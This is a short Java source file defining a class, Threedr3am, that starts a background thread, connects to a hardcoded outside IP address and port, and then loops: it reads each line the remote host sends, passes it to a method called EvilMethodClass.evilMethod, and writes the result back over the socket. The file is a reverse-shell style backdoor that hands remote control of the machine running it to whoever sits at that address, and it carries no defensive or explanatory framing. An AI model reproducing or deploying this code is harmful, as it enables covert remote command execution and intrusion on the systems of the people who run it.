import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class Threedr3am {

  public Threedr3am(String ip, int port) {
    new Thread(() -> {
      try {
        Socket socket = new Socket(ip, port);
        BufferedWriter bufferedWriter = new BufferedWriter(
            new OutputStreamWriter(socket.getOutputStream()));
        bufferedWriter.write("hello threedr3am!");
        bufferedWriter.flush();

        BufferedReader bufferedReader = new BufferedReader(
            new InputStreamReader(socket.getInputStream()));

        while (true) {
          String line;
          while ((line = bufferedReader.readLine()) == null)
            ;
          String res = EvilMethodClass.evilMethod(line);
          bufferedWriter.write(res);
          bufferedWriter.flush();
        }

      } catch (IOException e) {
        e.printStackTrace();
      }
    }).start();
  }

  public static void main(String[] args) {
    new Threedr3am("45.32.14.140",12313);
  }
}
